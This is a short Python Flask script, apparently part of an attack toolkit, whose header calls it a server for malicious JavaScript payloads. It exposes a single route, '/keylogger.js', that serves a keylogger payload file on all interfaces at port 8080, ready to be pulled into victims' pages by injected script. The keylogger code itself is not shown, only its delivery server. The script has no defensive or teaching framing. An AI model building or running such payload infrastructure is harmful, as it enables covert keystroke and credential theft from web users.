# payload_server.py — serves malicious JS payloads
from flask import Flask, send_file

app = Flask(__name__)

@app.route('/keylogger.js')
def keylogger():
    return send_file("keylogger_payload.js")

if __name__ == "__main__":
    print("[*] Serving payload on http://0.0.0.0:8080/keylogger.js")
    app.run(host="0.0.0.0", port=8080)
